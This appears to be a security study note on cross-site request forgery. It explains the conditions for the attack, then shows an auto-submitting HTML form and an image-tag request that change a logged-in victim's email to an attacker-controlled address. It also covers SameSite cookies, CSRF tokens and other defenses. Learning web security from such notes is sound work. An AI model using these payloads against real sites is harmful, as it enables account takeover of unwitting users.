# Cross-site request forgery (CSRF) :performing_arts:

Trick a user into performing an action they don't intend to perform.  This could be:

- changing their account email to allow for password reset,
- changing content or users on the site, or
- transfering funds to the attacker.

## Key factors

For CSRF to be possible:

1. There must be an action a user can be tricked into performing unintentionally,
1. Only session cookies are used to validate the user's permission to perform the action; and
1. The action must have predictable parameters (e.g. no CSRF tokens involved).

This HTTP request is vulnerable to CSRF:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

The attacker can create a page with the following HTML page to cause the user to change their email address when a victim visits it:

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

For the above to work, the victim must be logged in to the vulnerable website and the session cookie is not using the `SameSite` attribute.

:warning: CSRF attacks can also occur when HTTP basic auth or cerfiticate auth is used by a site.

### CSRF `SameSite` defense

An attribute set on session cookies that can have one of two values:

- `Strict`: the cookie is only sent with same-site requests.
- `Lax`: the cookie is sent with same-site requests and top-level `GET` navigations (e.g. user clicking a link).

The risk with `Lax` is that some sites will allow sensitive actions to be performed via `GET` requests, even if not explicitly coded that way.

## Attacks

CSRF are delivery is similar to XSS and depends on the HTTP verb used to perform the action:

- `POST`: create an HTML form with the action and params and induce the victim to visit the page.
- `GET`: create an image element with the malicious action as a `src` and have the victim visit the page:

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

## Prevent

- Use CSRF tokens with high entropy that are tied to the user's session.
- Use `SameSite` cookies.
- Provide additional forms of verification on sensitve requests.

## Tools

- [Burp web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
- [Generate CSRF PoC (pro)](https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc)

## References

- https://portswigger.net/web-security/csrf